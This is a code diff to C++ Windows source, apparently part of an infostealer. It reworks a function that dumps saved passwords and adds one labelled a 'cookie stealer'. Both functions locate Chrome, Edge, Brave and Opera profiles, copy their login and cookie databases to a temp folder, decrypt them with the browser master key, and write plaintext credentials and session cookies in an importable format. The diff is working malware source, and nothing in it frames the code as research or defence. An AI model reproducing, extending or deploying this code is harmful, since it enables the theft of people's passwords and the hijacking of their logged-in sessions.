@@ -11,6 +11,8 @@
 #include "../crypto/AesGcm.h"
 #include <nlohmann/json.hpp>
 #include <sqlite3.h>
+#include <sstream>
+#include <iomanip>
 
 #pragma comment(lib, "crypt32.lib")
 
@@ -70,85 +72,165 @@ namespace credential {
         }
     }
 
+    namespace {
+        struct BrowserPath {
+            std::string name;
+            std::string userDataPath;
+        };
+
+        std::vector<BrowserPath> GetChromiumBrowsers() {
+            char path[MAX_PATH];
+            std::vector<BrowserPath> browsers;
+            if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, path))) {
+                std::string localAppData(path);
+                browsers.push_back({"Chrome", localAppData + "\\Google\\Chrome\\User Data"});
+                browsers.push_back({"Edge", localAppData + "\\Microsoft\\Edge\\User Data"});
+                browsers.push_back({"Brave", localAppData + "\\BraveSoftware\\Brave-Browser\\User Data"});
+            }
+            char appDataPath[MAX_PATH];
+            if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath))) {
+                std::string appData(appDataPath);
+                browsers.push_back({"Opera", appData + "\\Opera Software\\Opera Stable"});
+            }
+            return browsers;
+        }
+    }
+
     std::string DumpChromiumPasswords() {
-        std::string report = "BROWSER_CREDENTIALS:\n";
-        report += "URL                                      USERNAME             PASSWORD\n";
+        std::string report = "CHROMIUM_PASSWORDS_DUMPED:\n";
+        report += "BROWSER | URL | USERNAME | PASSWORD\n";
         report += "--------------------------------------------------------------------------------\n";
 
-        char path[MAX_PATH];
-        if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, path))) {
-            std::string localAppData(path);
-            
-            struct BrowserPath {
-                std::string name;
-                std::string userDataPath;
-            };
+        auto browsers = GetChromiumBrowsers();
 
-            std::vector<BrowserPath> browsers = {
-                {"Chrome", localAppData + "\\Google\\Chrome\\User Data"},
-                {"Edge", localAppData + "\\Microsoft\\Edge\\User Data"},
-                {"Brave", localAppData + "\\BraveSoftware\\Brave-Browser\\User Data"},
-                {"Opera", std::string(getenv("APPDATA")) + "\\Opera Software\\Opera Stable"}
-            };
+        for (const auto& browser : browsers) {
+            if (!fs::exists(browser.userDataPath)) continue;
 
-            for (const auto& browser : browsers) {
-                if (!fs::exists(browser.userDataPath)) continue;
+            std::string localState = browser.userDataPath + "\\Local State";
+            std::vector<BYTE> key = GetMasterKey(localState);
+            if (key.empty()) continue;
 
-                std::string localState = browser.userDataPath + "\\Local State";
-                std::vector<BYTE> key = GetMasterKey(localState);
-                if (key.empty()) continue;
+            try {
+                for (auto it = fs::recursive_directory_iterator(browser.userDataPath); it != fs::recursive_directory_iterator(); ++it) {
+                    if (it.depth() > 3) { it.disable_recursion_pending(); continue; }
 
-                // Recursively find "Login Data" to catch all profiles
-                try {
-                    for (auto it = fs::recursive_directory_iterator(browser.userDataPath); it != fs::recursive_directory_iterator(); ++it) {
-                        const auto& entry = *it;
-                        if (entry.path().filename() == "Login Data") {
-                            std::string loginData = entry.path().string();
-                            
-                            // Copy to temp to avoid locks
-                            char tempPath[MAX_PATH];
-                            GetTempPathA(MAX_PATH, tempPath);
-                            std::string tempDb = std::string(tempPath) + "temp_login_db_" + browser.name + "_" + std::to_string(GetTickCount());
-                            CopyFileA(loginData.c_str(), tempDb.c_str(), FALSE);
+                    const auto& entry = *it;
+                    if (entry.path().filename() == "Login Data") {
+                        std::string loginData = entry.path().string();
 
-                            sqlite3* db;
-                            if (sqlite3_open(tempDb.c_str(), &db) == SQLITE_OK) {
-                                const char* query = "SELECT origin_url, username_value, password_value FROM logins";
-                                sqlite3_stmt* stmt;
-                                if (sqlite3_prepare_v2(db, query, -1, &stmt, NULL) == SQLITE_OK) {
-                                    while (sqlite3_step(stmt) == SQLITE_ROW) {
-                                        const char* url_ptr = (const char*)sqlite3_column_text(stmt, 0);
-                                        const char* user_ptr = (const char*)sqlite3_column_text(stmt, 1);
-                                        if (!url_ptr || !user_ptr) continue;
+                        char tempPath[MAX_PATH];
+                        GetTempPathA(MAX_PATH, tempPath);
+                        std::string tempDb = std::string(tempPath) + "temp_login_db_" + std::to_string(GetTickCount());
 
-                                        std::string url = url_ptr;
-                                        std::string username = user_ptr;
-                                        const void* blob = sqlite3_column_blob(stmt, 2);
-                                        int blobLen = sqlite3_column_bytes(stmt, 2);
-                                        
-                                        if (blobLen > 0) {
-                                            std::vector<BYTE> encryptedPass((BYTE*)blob, (BYTE*)blob + blobLen);
-                                            std::string password = DecryptPassword(encryptedPass, key);
+                        if (!CopyFileA(loginData.c_str(), tempDb.c_str(), FALSE)) continue;
 
-                                            if (!password.empty() && !username.empty()) {
-                                                report += browser.name + " | " + url + " | " + username + " | " + password + "\n";
-                                            }
+                        sqlite3* db;
+                        if (sqlite3_open(tempDb.c_str(), &db) == SQLITE_OK) {
+                            const char* query = "SELECT origin_url, username_value, password_value FROM logins";
+                            sqlite3_stmt* stmt;
+                            if (sqlite3_prepare_v2(db, query, -1, &stmt, NULL) == SQLITE_OK) {
+                                while (sqlite3_step(stmt) == SQLITE_ROW) {
+                                    const char* url_ptr = (const char*)sqlite3_column_text(stmt, 0);
+                                    const char* user_ptr = (const char*)sqlite3_column_text(stmt, 1);
+                                    if (!url_ptr || !user_ptr) continue;
+
+                                    std::string url = url_ptr;
+                                    std::string username = user_ptr;
+                                    const void* blob = sqlite3_column_blob(stmt, 2);
+                                    int blobLen = sqlite3_column_bytes(stmt, 2);
+
+                                    if (blobLen > 0) {
+                                        std::vector<BYTE> encryptedPass((BYTE*)blob, (BYTE*)blob + blobLen);
+                                        std::string password = DecryptPassword(encryptedPass, key);
+
+                                        if (!password.empty() && !username.empty()) {
+                                            report += browser.name + " | " + url + " | " + username + " | " + password + "\n";
                                         }
                                     }
-                                    sqlite3_finalize(stmt);
                                 }
-                                sqlite3_close(db);
+                                sqlite3_finalize(stmt);
                             }
-                            DeleteFileA(tempDb.c_str());
+                            sqlite3_close(db);
                         }
-                        // Limit depth to avoid scanning everything
-                        if (it.depth() > 3) it.disable_recursion_pending();
+                        DeleteFileA(tempDb.c_str());
                     }
-                } catch (...) {}
-            }
+                }
+            } catch (...) {}
+        }
+        return report;
+    }
+
+    std::string StealChromiumCookies() {
+        std::stringstream ss;
+        ss << "# CHROMIUM COOKIE STEALER RESULTS\n";
+        ss << "# Netscape HTTP Cookie File Format\n\n";
+
+        auto browsers = GetChromiumBrowsers();
+        int totalCookies = 0;
+
+        for (const auto& browser : browsers) {
+            if (!fs::exists(browser.userDataPath)) continue;
+
+            std::string localState = browser.userDataPath + "\\Local State";
+            std::vector<BYTE> key = GetMasterKey(localState);
+            if (key.empty()) continue;
+
+            try {
+                for (auto it = fs::recursive_directory_iterator(browser.userDataPath); it != fs::recursive_directory_iterator(); ++it) {
+                    if (it.depth() > 3) { it.disable_recursion_pending(); continue; }
+
+                    const auto& entry = *it;
+                    if (entry.path().filename() == "Cookies") {
+                        std::string cookiePath = entry.path().string();
+
+                        char tempPath[MAX_PATH];
+                        GetTempPathA(MAX_PATH, tempPath);
+                        std::string tempDb = std::string(tempPath) + "temp_cookie_db_" + std::to_string(GetTickCount());
+
+                        if (!CopyFileA(cookiePath.c_str(), tempDb.c_str(), FALSE)) continue;
+
+                        sqlite3* db;
+                        if (sqlite3_open(tempDb.c_str(), &db) == SQLITE_OK) {
+                            const char* query = "SELECT host_key, path, is_secure, expires_utc, name, encrypted_value FROM cookies";
+                            sqlite3_stmt* stmt;
+                            if (sqlite3_prepare_v2(db, query, -1, &stmt, NULL) == SQLITE_OK) {
+                                while (sqlite3_step(stmt) == SQLITE_ROW) {
+                                    const char* host = (const char*)sqlite3_column_text(stmt, 0);
+                                    const char* path = (const char*)sqlite3_column_text(stmt, 1);
+                                    int isSecure = sqlite3_column_int(stmt, 2);
+                                    sqlite3_int64 expiry = sqlite3_column_int64(stmt, 3);
+                                    const char* name = (const char*)sqlite3_column_text(stmt, 4);
+                                    const void* blob = sqlite3_column_blob(stmt, 5);
+                                    int blobLen = sqlite3_column_bytes(stmt, 5);
+
+                                    if (blobLen > 0) {
+                                        std::vector<BYTE> encryptedVal((BYTE*)blob, (BYTE*)blob + blobLen);
+                                        std::string value = DecryptPassword(encryptedVal, key);
+
+                                        if (!value.empty()) {
+                                            ss << (host ? host : "") << "\t"
+                                               << ((host && *host == '.') ? "TRUE" : "FALSE") << "\t"
+                                               << (path ? path : "") << "\t"
+                                               << (isSecure ? "TRUE" : "FALSE") << "\t"
+                                               << expiry << "\t"
+                                               << (name ? name : "") << "\t"
+                                               << value << "\n";
+                                            totalCookies++;
+                                        }
+                                    }
+                                }
+                                sqlite3_finalize(stmt);
+                            }
+                            sqlite3_close(db);
+                        }
+                        DeleteFileA(tempDb.c_str());
+                    }
+                }
+            } catch (...) {}
         }
 
-        return report;
+        if (totalCookies == 0) return "No Chromium cookies found.";
+        return ss.str();
     }
 
 }
